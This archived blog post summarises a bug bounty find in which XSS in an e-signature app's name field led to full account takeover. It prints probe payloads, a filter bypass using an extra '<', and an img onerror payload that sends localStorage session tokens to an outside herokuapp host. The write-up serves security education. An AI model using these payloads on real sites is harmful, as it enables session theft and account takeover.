# Day 3

- **Source URL:** https://medium.com/@danielbelay/day-3-account-takeover-via-xss-in-e-signature-feature-worth-2500-71db9449f74b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251124181140/https://medium.com/@danielbelay/day-3-account-takeover-via-xss-in-e-signature-feature-worth-2500-71db9449f74b
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8717 (id 8717)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# **Day 3: Account Takeover via XSS in E-Signature Feature (Worth $2500)**

## Introduction

For **Day 3** of my **100-day ATO challenge**, I read a fascinating write-up by **Gökhan Güzelkokar**, where he discovered an **XSS vulnerability in an e-signature feature** that led to a **full account takeover (ATO)**.

This bug bounty-worthy find highlights how **minor input validation mistakes** can lead to critical security risks.

## 🔍 How the Attack Worked

## Step 1: Discovering the XSS Payload

During testing, the researcher tried injecting an XSS payload in the **name field** of the application:

`"><img onerror=alert(document.domain) src>`
And it worked! The application **reflected** the payload, allowing JavaScript execution.

## Step 2: Crafting a More Powerful Payload

However, instead of stopping there, he tested **another variation** with a slight modification — just adding **one extra**

`"><<img onerror=alert(document.cookie) src>`
This successfully triggered an **alert** on the **admin page**, meaning an **unauthenticated attacker** could execute JavaScript in an admin’s session.

## Step 3: Stealing Session Data from Local Storage

Digging deeper, he found **sensitive session tokens** stored in `localStorage`, which meant an attacker could hijack accounts completely.

To steal the session tokens, he crafted this payload:

`"><<img src=x onerror=this.src='https://gkhck.herokuapp.com/p?cookie='+JSON.stringify(localStorage) />`
Once the **XSS was triggered**, all session tokens were exfiltrated to the attacker’s server, giving full control over the victim’s account.

## 🚀 Impact: Full Account Takeover & Data Breach

Since this e-signature app was **integrated with multiple cloud storage services**, a successful attack could result in:

✅ **Access to all signed documents**

✅ **Control over connected cloud storage accounts**

✅ **Exposure of sensitive company files**

This vulnerability had a **high severity**, earning the researcher a **$2500 bounty**! 💰

## 🔥 Key Takeaways

✔ **Even small input validation flaws can lead to full ATO**

✔ **Just a minor tweak (like an extra \<) can bypass filters**

✔ **Local storage is NOT a safe place for session tokens**

✔ **Always explore XSS chaining for maximum impact**

Huge credit to **@GökhanGüzelkokar** for this awesome find!
